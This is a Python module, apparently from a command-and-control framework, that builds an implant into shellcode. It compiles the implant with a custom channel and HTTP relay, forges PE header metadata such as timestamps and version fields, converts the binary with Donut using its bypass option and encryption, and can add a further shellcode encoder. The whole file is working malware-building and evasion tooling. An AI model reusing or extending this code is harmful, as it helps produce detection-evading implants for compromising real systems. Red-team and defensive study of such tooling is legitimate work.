import base64

from ...blocking_io import run_in_thread
from ..utils.paths import project, cleanup, file
from ..utils.prep import (
    replace as replace_placeholders,
    cleanup as cleanup_build,
    inject_preface,
    inject_custom_channel,
    inject_custom_http_relay,
)
from ..utils.build import exe as compile_main
from ..utils.donut import main as donut_main
from ..utils.migrate import migrate
from ..utils.encoder import apply_shellcode_encoder
from ..utils.pe import (
    create_pe_strings,
    timestamp,
    major_linker_version,
    minor_linker_version,
    major_os_version,
    minor_os_version,
    major_image_version,
    minor_image_version,
    major_subsystem_version,
    minor_subsystem_version,
)

arch = {"x86": 1, "x64": 2}
entropy = {"none": 1, "random": 2, "encrypt": 3}
compress = {"none": 1, "aplib": 2}
headers = {"overwrite": 1, "keep": 2}
exit_map = {"thread": 1, "process": 2, "block": 3}


async def main(body, tag):
    # Builds shellcode from the compiled implant
    config = body["config"]

    if config["arch"] not in arch:
        return {"status": "failure", "message": f"Unsupported arch '{config['arch']}'"}

    src = None
    try:
        src = await project(body)
        await run_in_thread(cleanup_build, src)
        await inject_custom_channel(config, src)
        await inject_custom_http_relay(config, src)
        build_tag = await replace_placeholders(
            src, config, tag, body.get("implant_base", "stageless")
        )

        if config.get("create_pe_strings"):
            await create_pe_strings(config, src)

        if config.get("preface"):
            await inject_preface(config, src)

        # COMPILE ===============================================================

        build = await compile_main(config, tag, body)
        if build.get("status") == "failure":
            return build

        stdout = build["stdout"]
        stderr = build["stderr"]
        built_path = build["path"]

        # NT HEADERS ============================================================

        if config.get("pe_timestamp"):
            built_path = await timestamp(config, tag, built_path)
        if config.get("pe_major_linker_version") is not None:
            built_path = await major_linker_version(config, tag, built_path)
        if config.get("pe_minor_linker_version") is not None:
            built_path = await minor_linker_version(config, tag, built_path)
        if config.get("pe_major_os_version") is not None:
            built_path = await major_os_version(config, tag, built_path)
        if config.get("pe_minor_os_version") is not None:
            built_path = await minor_os_version(config, tag, built_path)
        if config.get("pe_major_image_version") is not None:
            built_path = await major_image_version(config, tag, built_path)
        if config.get("pe_minor_image_version") is not None:
            built_path = await minor_image_version(config, tag, built_path)
        if config.get("pe_major_subsystem_version") is not None:
            built_path = await major_subsystem_version(config, tag, built_path)
        if config.get("pe_minor_subsystem_version") is not None:
            built_path = await minor_subsystem_version(config, tag, built_path)

        # DONUT =================================================================

        donut_args = {
            "file": built_path,
            "arch": arch[config["arch"]],
            "bypass": 1,
            "entropy": entropy[config.get("donut_entropy", "encrypt")],
            "compress": compress[config.get("donut_compress", "none")],
            "headers": headers[config.get("donut_headers", "overwrite")],
            "exit_opt": exit_map[config.get("donut_exit", "thread")],
        }
        if config.get("donut_thread"):
            donut_args["thread"] = 1

        shellcode = await donut_main(tag, **donut_args)
        if shellcode is None:
            return {
                "status": "failure",
                "message": "Donut failed to generate shellcode",
                "stdout": stdout,
                "stderr": stderr,
            }

        if build_tag:
            source_path = await file(tag, ".shellcode.bin")

            def write_shellcode_source():
                # Writes the shellcode bytes to disk
                with open(source_path, "wb") as handle:
                    handle.write(shellcode)

            await run_in_thread(write_shellcode_source)
            await migrate(build_tag, source_path, config, tag, body)

        encoder = str(config.get("shellcode_encoder") or "off").strip().lower()
        if encoder not in ("", "off", "none"):
            shellcode, enc_err = await apply_shellcode_encoder(shellcode, config, tag)
            if enc_err:
                return {
                    "status": "failure",
                    "message": enc_err,
                    "stdout": stdout,
                    "stderr": stderr,
                }

        return {
            "status": "success",
            "message": "Implant built successfully",
            "bytes": base64.b64encode(shellcode).decode(),
            "stdout": stdout,
            "stderr": stderr,
        }
    finally:
        await cleanup(tag)
        await run_in_thread(cleanup_build, src)
